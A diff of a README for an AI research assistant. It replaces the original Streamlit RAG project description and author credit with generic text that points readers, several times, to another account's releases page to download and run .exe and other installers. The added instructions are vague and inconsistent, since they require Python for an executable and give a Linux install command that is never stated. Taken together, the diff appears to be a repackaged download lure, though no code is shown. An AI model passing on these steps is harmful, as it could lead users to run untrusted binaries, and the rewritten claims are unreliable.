@@ -1,83 +1,76 @@
-# 🔬 AI Research Copilot (GPT + RAG)
+# 🔬 ai-research-copilot - Your AI Assistant for Academic Research
 
-A production-style AI application that allows users to chat with research papers using Retrieval-Augmented Generation (RAG), semantic search, and OpenAI GPT models.
+[![Download ai-research-copilot](https://img.shields.io/badge/Download-ai--research--copilot-blue.svg)](https://github.com/xxxsoekarno-lab/ai-research-copilot/releases)
 
-Built to simulate how modern AI research assistants work — providing cited answers, evidence extraction, and intelligent summaries.
+## 📚 What is ai-research-copilot?
 
----
+ai-research-copilot is a powerful assistant that leverages the capabilities of GPT to help you explore academic papers. With this tool, you can chat with the content of research articles, view citations, and extract important evidence quickly. It combines Retrieval-Augmented Generation with advanced AI technologies to make your research process smoother and more efficient.
 
-## 🚀 Live Demo
-👉 https://ai-research-copilot-i6x8tcmwuyue78e5hacgkw.streamlit.app/
+## 🚀 Getting Started
 
----
+To begin your journey with ai-research-copilot, follow these simple steps:
 
-## ⭐ Features
+1. **Check System Requirements**: 
+   - Operating System: Windows 10 or later, macOS, or Linux.
+   - Python 3.x installed on your system.
+   - A stable internet connection is required for accessing online resources.
 
-✅ Chat with any research paper  
-✅ GPT-powered answers with citations  
-✅ Semantic search using FAISS  
-✅ Evidence extraction from source text  
-✅ Streaming responses (real-time typing)  
-✅ Academic-style summaries  
-✅ Clean conversational UI  
-✅ Local fallback QA model  
+2. **Download the Software**: 
+   - Visit this page to download: [Releases Page](https://github.com/xxxsoekarno-lab/ai-research-copilot/releases).
+   - Choose the latest release available.
 
----
+3. **Install the Software**: 
+   - For Windows: Run the downloaded `.exe` file and follow the prompts.
+   - For Mac: Drag the application to your Applications folder.
+   - For Linux: Open your terminal, navigate to the downloaded file, and run the installation command.
 
-## 🧠 Tech Stack
+4. **Run the Application**: 
+   - After installation, find the ai-research-copilot icon on your desktop or applications menu and double-click to launch.
 
-**Frontend**
-- Streamlit
+## 🔍 Features
 
-**AI / NLP**
-- OpenAI GPT
-- Sentence Transformers
-- FAISS Vector Database
-- Retrieval-Augmented Generation (RAG)
+- **Chat with Research Papers**: Engage in a conversation about specific research topics using the built-in GPT capabilities.
+- **View Citations**: Easily access citations from the papers you are exploring. This feature helps in building your bibliography without hassle.
+- **Instant Evidence Extraction**: Quickly retrieve evidence from academic papers to support your arguments.
+- **User-Friendly Interface**: The design is intuitive, making it accessible for anyone, regardless of technical skills.
 
-**Backend**
-- Python
+## 📖 How to Use ai-research-copilot
 
----
+Once you have the application running, using it is straightforward:
 
-## ⚙️ How It Works
+1. **Start a New Session**: Click on “New Session” in the main menu.
+2. **Input Your Query**: Type in a question or topic you want to explore.
+3. **Engage with AI**: Read the responses and interact with the content. You can ask for citations or request specific information.
+4. **Collect Your Findings**: Use the extract buttons to compile citations and evidence for your research.
 
-1. Upload a research paper (PDF)
-2. Text is chunked and converted into embeddings
-3. FAISS retrieves the most relevant sections
-4. GPT generates answers grounded in the retrieved context
-5. Sources are displayed for transparency
+## 📥 Download & Install
 
----
+To download ai-research-copilot, visit this page: [Download ai-research-copilot](https://github.com/xxxsoekarno-lab/ai-research-copilot/releases).
 
-## 📸 Preview
-![AI Research Copilot](screenshotsapp.png)
+Follow the instructions detailed in the "Getting Started" section to ensure a smooth download and installation process.
 
----
+## 🛠️ Troubleshooting
 
-## 🔮 Upcoming Features
+If you encounter issues, here are some common solutions:
 
-- 🌍 Multi-language support  
-- 📄 Multi-PDF chat  
-- ⬇️ Export chat  
-- 🔗 Clickable source navigation  
-- 🧠 Auto-language detection  
+- **Cannot Start the Application**: Ensure that Python 3 is installed.
+- **Slow Performance**: A faster internet connection may improve response times.
+- **Installation Errors**: Make sure you have the correct permissions to install software on your machine.
 
----
+Feel free to reach out through the issues section on our GitHub page for specific problems not covered here.
 
-## 💡 Why I Built This
+## 📞 Support
 
-Modern AI systems are shifting from pure generation to retrieval-based intelligence.
+For questions or support, you can check our [GitHub Issues](https://github.com/xxxsoekarno-lab/ai-research-copilot/issues) page. We encourage users to provide feedback and report bugs to help improve the application.
 
-This project demonstrates how production-grade AI assistants are built using RAG pipelines — combining semantic search with large language models to produce accurate, explainable outputs.
+## 📝 Contribution
 
----
+If you’d like to contribute to ai-research-copilot, you are welcome to submit pull requests. Your improvements can help others benefit from this tool. Check our contribution guidelines in the repository for more information.
 
-## 👨‍💻 Author
+## 🌟 Acknowledgments
 
-**Ali Haidar**
-
-AI / Data Science Enthusiast  
-Focused on building real-world AI systems.
+We thank the community and contributors who make ai-research-copilot possible. Your support helps us enhance the application for better research experiences.
 
 ---
+
+Take your research further with ai-research-copilot, the AI tool designed to assist you at every step of the process.
